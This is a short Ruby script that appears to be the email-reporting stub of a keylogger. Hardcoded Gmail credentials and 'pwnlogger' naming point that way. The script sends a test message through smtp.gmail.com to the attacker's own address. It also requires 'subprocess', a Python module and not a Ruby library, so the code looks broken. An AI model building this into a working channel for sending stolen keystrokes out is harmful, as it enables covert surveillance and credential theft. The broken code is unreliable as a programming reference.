require 'net/smtp'
require 'subprocess'

EMAIL = "pwnlogger7@gmail.com"
PASSWORD = "beeloggerpass1"
message = <<BODY
Test mail
BODY

message = " ** MRepporter ** \n" + message

Net::SMTP.start('smtp.gmail.com', 587, 'localhost', EMAIL, PASSWORD, :plain) do |smtp|
  smtp.send_message message, EMAIL, EMAIL
end
